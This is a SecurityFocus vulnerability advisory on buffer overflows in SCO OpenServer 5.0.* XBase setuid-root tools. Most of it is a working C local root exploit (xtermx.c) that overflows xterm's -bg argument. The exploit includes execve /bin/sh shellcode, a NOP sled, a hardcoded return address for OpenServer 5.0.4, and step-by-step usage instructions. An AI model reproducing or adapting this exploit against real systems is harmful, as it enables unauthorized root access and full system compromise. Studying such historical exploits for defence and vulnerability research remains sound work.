source: http://www.securityfocus.com/bid/479/info

The XBase package that ships with SCO OpenServer 5.0.* is vulnerable to several buffer overflow attacks in many different XBase tools. The tools that are installed setuid root allow local users to gain superuser privileges. This is because they contain buffers which they copy data into assuming that the length is not exceeded. The vulnerabilities in the XBase package will let a local user trivially execute arbitrary code as root (if the binary exploited it setuid root) and compromise the security of entire system.


/*
* <xtermx.c> Local root exploit
*
* Offset: xterm (SCO OpenServer 5.0.4)
* 0 -> From an open scoterm (without display parameter)
* 2000 -> From remote telnet (with display parameter)
*
* Usage:
* $ cc xtermx.c -o xtermx
* $ scoterm
* $ /usr/bin/X11/xterm -bg `xtermx`
* or
* $ /usr/bin/X11/xterm -display 1.1.1.1:0 -bg `xtermx 2000`
*
* Note: xterm need to be run from a valid x-display
*
* By: The Dark Raver of CPNE (Murcia/Spain - 22/6/99)
*
*
* <http://members.tripod.com/~ochodedos> - <doble@iname.com>
*
*/

#include <stdlib.h>
#include <stdio.h>


char hell[]=
"\xeb\x1b\x5e\x31\xdb\x89\x5e\x07\x89\x5e\x0c\x88\x5e\x11\x31\xc0"
"\xb0\x3b\x8d\x7e\x07\x89\xf9\x53\x51\x56\x56\xeb\x10\xe8\xe0\xff"
"\xff\xff/bin/sh\xaa\xaa\xaa\xaa\x9a\xaa\xaa\xaa\xaa\x07\xaa";

/*
char hell[]=
"\xeb\x1b" // start: jmp uno
"\x5e" // dos: popl %esi
"\x31\xdb" // xorl %ebx,%ebx
"\x89\x5e\x07" // movb %bl,0x7(%esi)
"\x89\x5e\x0c" // movl %ebx,0x0c(%esi)
"\x88\x5e\x11" // movb %bl,0x11(%esi)
"\x31\xc0" // xorl %eax,%eax
"\xb0\x3b" // movb $0x3b,%al
"\x8d\x7e\x07" // leal 0x07(%esi),%edi
"\x89\xf9" // movl %edi,%ecx
"\x53" // pushl %ebx
"\x51" // pushl %ecx
"\x56" // pushl %esi
"\x56" // pushl %esi
"\xeb\x10" // jmp execve
"\xe8\xe0\xff\xff\xff" // uno: call dos
"/bin/sh"
"\xaa\xaa\xaa\xaa"
"\x9a\xaa\xaa\xaa\xaa\x07\xaa"; // execve: lcall 0x7,0x0
*/


#define OFF 0x80471ff // SCO OpenServer 5.0.4
#define ALINEA 0
#define LEN 2000


int main(int argc, char *argv[]) {

int offset=0;
char buf[LEN];
int i;

if(argc < 2) {
printf("Usage: xtermx [offset]\n"); }
else {
offset=atoi(argv[1]); }

memset(buf,0x90,LEN);
memcpy(buf+1000,hell,strlen(hell));
for(i=1100+ALINEA;i<LEN-4;i+=4)
*(int *)&buf[i]=OFF+offset;

for(i=0;i<LEN;i++)
putchar(buf[i]);

exit(0);
}